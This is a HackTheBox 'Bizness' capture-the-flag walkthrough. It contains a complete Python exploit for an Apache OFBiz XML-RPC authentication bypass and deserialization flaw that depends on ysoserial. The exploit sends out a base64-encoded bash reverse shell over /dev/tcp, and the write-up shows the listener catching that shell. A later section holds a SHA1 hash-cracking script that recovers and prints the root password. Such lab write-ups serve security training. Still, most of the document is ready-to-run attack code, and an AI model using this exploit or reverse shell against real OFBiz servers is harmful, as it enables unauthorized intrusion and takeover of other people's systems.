# ⚽ Bizness HackTheBox Walkthrough!!



<figure><img src=".gitbook/assets/1bzTNw3LTCoJnMsMY23czMg.webp" alt=""><figcaption></figcaption></figure>



Add the IP into the hosts

```
sudo nano /etc/hosts
```



<figure><img src=".gitbook/assets/1DA3pkQ8JWDPQS4afMkJrQA.webp" alt=""><figcaption></figcaption></figure>

**NMAP RESULT:**

```
┌──(Batman㉿GC)-[~]
└─$ nmap -A 10.10.11.252 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 13:18 IST
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp   open  http     nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp  open  ssl/http nginx 1.18.0
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.18.0
|_http-title: BizNess Incorporated
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
5555/tcp open  http     SimpleHTTPServer 0.6 (Python 3.9.2)
|_http-server-header: SimpleHTTP/0.6 Python/3.9.2
|_http-title: Directory listing for /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.77 seconds
```

**GAINING SHELL ACCESS**

POC

Save the file as exploit.py

```
import requests, sys, subprocess,base64,urllib3,os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



headers = {
    'Content-Type': 'application/xml'
}


def rce(url,arg):
    try:
        payload=subprocess.check_output(["java","-jar","ysoserial-all.jar","CommonsBeanutils1",arg])
    except:
        sys.exit("""
        Command didn't executed, please make sure you have java binary v11
        this exploit tested on this env
        openjdk version "11.0.17" 2022-10-18
        OpenJDK Runtime Environment (build 11.0.17+8-post-Debian-2)
        OpenJDK 64-Bit Server VM (build 11.0.17+8-post-Debian-2, mixed mode, sharing)
        """)

    base64_payload=base64.b64encode(payload).decode()
    xml_data = '''<?xml version="1.0"?>
    <methodCall>
        <methodName>RCE-Test</methodName>
        <params>
            <param>
                <value>
                    <struct>
                        <member>
                            <name>rce</name>
                            <value>
                                <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                                %s
                                </serializable>
                            </value>
                        </member>
                    </struct>
                </value>
            </param>
        </params>
    </methodCall>
    '''%base64_payload
    r=requests.post(url+"webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y",data=xml_data,headers=headers,verify=False)
    if "java.lang.reflect.InvocationTargetException" in r.text:
        print("Exploit Completed Successfully !")
    else:
        print("Not Sure Worked or not ")



def dns(url,arg):
    try:
        payload=subprocess.check_output(["java","-jar","ysoserial-all.jar","URLDNS",arg])
    except:
        sys.exit("""
        Command didn't executed, please make sure you have java binary v11
        this exploit tested on this env
        openjdk version "11.0.17" 2022-10-18
        OpenJDK Runtime Environment (build 11.0.17+8-post-Debian-2)
        OpenJDK 64-Bit Server VM (build 11.0.17+8-post-Debian-2, mixed mode, sharing)
        """)
    base64_payload=base64.b64encode(payload).decode()
    xml_data = '''<?xml version="1.0"?>
    <methodCall>
        <methodName>Dns</methodName>
        <params>
            <param>
                <value>
                    <struct>
                        <member>
                            <name>rce</name>
                            <value>
                                <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">
                                %s
                                </serializable>
                            </value>
                        </member>
                    </struct>
                </value>
            </param>
        </params>
    </methodCall>
    '''%base64_payload
    r=requests.post(url+"webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y",data=xml_data,headers=headers,verify=False)
    if "No such service" in r.text:
        print("Exploit Completed Successfully !")
    else:
        print("Not Sure Worked or not ")

def shell(url,arg):
    try:
        ip=arg.split(":")[0]
        port=int(arg.split(":")[1])
        rev_shell_command="bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip,port=port)
        encoded_rev_shell_command=base64.b64encode(rev_shell_command.encode()).decode()
        rev_shell1='bash -c echo${IFS}%s|base64${IFS}-d|bash'%encoded_rev_shell_command
        rce(url,rev_shell1)

    except:
        sys.exit("Please make sure from data")


def main():

    if not len(sys.argv) > 3:
        sys.exit("""
                Usage: 
                python3 exploit.py target_url rce command
                python3 exploit.py target_url dns dns_url
                python3 exploit.py target_url shell ip:port
                """)

    if not os.path.exists("ysoserial-all.jar"):
        sys.exit("ysoserial-all.jar file must be in the same directory")

    target_url=str(sys.argv[1])
    action=str(sys.argv[2])
    arg=str(sys.argv[3])
    if not target_url.endswith("/"):
        target_url=target_url+"/"
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        sys.exit("""
                Please Enter a Valid target_url
                Ex: https://example.com
                """)

    if action == "rce":
        rce(target_url,arg)
    elif action == "dns":
        if not arg.startswith("http://") and not arg.startswith("https://"):
                    sys.exit("""
                Please Enter a Valid dns url
                Ex: https://example.com
                """)
        dns(target_url,arg)

    elif action == "shell":
        shell(target_url,arg)
    else:
        sys.exit("""
        Usage: 
        python3 exploit.py target_url rce command
        python3 exploit.py target_url dns dns_url
        python3 exploit.py target_url shell ip:port
        """)

main() 
```

Download the following file and give permission

{% embed url="https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar" %}

```
chmod +x ysoserial-all.jar
```

Now install

```
sudo apt-get install openjdk-11-jdk
```

Once it's installed, run the following command.

```
┌──(Batman㉿GC)-[~/Bizness/Bizness]
└─$ sudo update-alternatives --config java
sudo: unable to resolve host GC: Name or service not known
There are 2 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                         Priority   Status
------------------------------------------------------------
* 0            /usr/lib/jvm/java-17-openjdk-arm64/bin/java   1711      auto mode
  1            /usr/lib/jvm/java-11-openjdk-arm64/bin/java   1111      manual mode
  2            /usr/lib/jvm/java-17-openjdk-arm64/bin/java   1711      manual mode

Press <enter> to keep the current choice[*], or type selection number: 1
update-alternatives: using /usr/lib/jvm/java-11-openjdk-arm64/bin/java to provide /usr/bin/java (java) in manual mode
```

We should change the mode to 1.

Now run the **exploit.py** along with the nc shell in another tab.

```
┌──(Batman㉿GC)-[~/Bizness]
└─$ python3 exploit.py https://bizness.htb shell 10.10.14.60:4444
```

```
┌──(Batman㉿GC)-[~]
└─$ nc -lvnp 4444           
listening on [any] 4444 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.252] 36864
bash: cannot set terminal process group (716): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$
```

Now you will get the shell access.

**PRIVILEGE ESCALATION.**

```
ofbiz@bizness:/opt/ofbiz$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

Since we don’t have the password of the current user we should try another way.

Save the given piece of code in **.txt** format.

```
import hashlib
import base64
import os
def cryptBytes(hash_type, salt, value):
    if not hash_type:
        hash_type = "SHA"
    if not salt:
        salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
    hash_obj = hashlib.new(hash_type)
    hash_obj.update(salt.encode('utf-8'))
    hash_obj.update(value)
    hashed_bytes = hash_obj.digest()
    result = f"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
    return result
def getCryptedBytes(hash_type, salt, value):
    try:
        hash_obj = hashlib.new(hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
    except hashlib.NoSuchAlgorithmException as e:
        raise Exception(f"Error while computing hash of type {hash_type}: {e}")
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'
with open(wordlist,'r',encoding='latin-1') as password_list:
    for password in password_list:
        value = password.strip()
        hashed_password = cryptBytes(hash_type, salt, value.encode('utf-8'))
        # print(hashed_password)
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
```

Now run the following command.

```
┌──(Batman㉿GC)-[~/Bizness/Bizness]
└─$ python3 get_password.txt
Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
```

Now you have got the password to get the root access.

```
ofbiz@bizness:~$ su root
Password: 
root@bizness:/home/ofbiz#
```

Hurray!! Now you are ROOT!!



<figure><img src=".gitbook/assets/1VqLYs481X9kw_CTosgqlcg.webp" alt="" width="375"><figcaption><p><a href="https://www.buymeacoffee.com/b4tm4n">https://www.buymeacoffee.com/b4tm4n</a></p></figcaption></figure>
